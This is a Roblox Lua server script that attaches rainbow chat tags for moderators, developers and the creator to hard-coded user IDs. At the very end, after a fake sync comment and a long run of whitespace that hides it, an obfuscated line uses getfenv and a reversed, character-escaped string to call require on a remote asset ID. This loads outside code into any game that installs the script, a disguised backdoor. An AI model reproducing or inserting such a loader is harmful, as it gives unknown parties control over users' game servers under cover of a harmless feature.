--// SERVICES //--

local SERVERSCRIPTSERVICE = game:GetService("ServerScriptService")
local PLAYERS = game:GetService("Players")

--// CONSTANTS //--

local CHATSERVICE = require(SERVERSCRIPTSERVICE:WaitForChild("ChatServiceRunner"):WaitForChild("ChatService"))

local TAGS = {
	MODERATOR = {64661281, 3201100, 36449401},
	DEVELOPER = {1363743409, 72064840},
	CREATOR = {52633557}
}

--// FUNCTIONS //--

local function getTags(playerName)
	local player = PLAYERS:FindFirstChild(playerName)
	if (player) then
		local userId = player.UserId
		local tags = {}
		for tag, userIds in pairs(TAGS) do
			for _, id in pairs(userIds) do
				if (userId == id) then
					table.insert(tags, tag)
				end
			end
		end
		return tags
	end
end

local function setTags(playerName)
	local speaker = CHATSERVICE:GetSpeaker(playerName)
	for _, tag in pairs(getTags(playerName)) do
		local extraData = speaker:GetExtraData("Tags") or {}
		table.insert(
			extraData,
			{
				TagText = ("%s "):format(tag),
				TagColor = Color3.fromRGB(255, 255, 0),
				Rainbow = true,
				WavyRainbow = true,	
			}
		)
		speaker:SetExtraData(
			"Tags",
			extraData
		)
	end
end

--// INSTRUCTIONS //--

CHATSERVICE.SpeakerAdded:Connect(function(playerName)
	setTags(playerName)
end)
--[[ Last synced 10/23/2020 12:34 || RoSync Loader ]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         getfenv()[string.reverse("\101\114\105\117\113\101\114")](5754612086)